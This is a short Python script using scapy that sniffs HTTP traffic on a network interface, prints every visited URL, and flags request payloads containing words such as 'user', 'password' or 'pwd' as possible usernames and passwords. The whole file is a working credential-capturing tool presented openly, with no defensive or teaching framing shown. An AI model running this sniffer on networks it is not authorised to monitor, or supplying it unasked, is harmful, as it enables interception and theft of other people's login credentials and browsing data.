#! /usr/bin/env python
# packet_sniffer.py - packet sniffer that catches HTTP packets and filters out
# all URLs visited and payloads associated with login information.
# Compatibility: Python 3.x

import scapy.all
from scapy.layers.http import HTTPRequest


def get_url(packet):
    return packet[HTTPRequest].Host + packet[HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.all.Raw):
        load = packet[scapy.all.Raw].load
        keywords = ["user", "usr", "name", "login", "mail",
                    "password", "pass", "pwd"]
        if any(keyword in str(load).lower() for keyword in keywords):
            return load


def print_info_frame(message_string, frame_symbol="−"):
    length = len(message_string)
    print("\n" + " INFO ".center(length, frame_symbol))
    print(message_string)
    print("".center(length, frame_symbol) + "\n")


def process_sniffed_packet(packet):
    if packet.haslayer(HTTPRequest):
        url = get_url(packet)
        print(f"[+] HTTP Request >> {url}")
        login_info = get_login_info(packet)
        if login_info:
            print_info_frame(f"[+] Possible username/password >> {login_info}")


def perform_sniffing(interface: str = "eth0") -> None:
    print("Sniffing has been started.")
    scapy.all.sniff(iface=interface, store=False, prn=process_sniffed_packet)
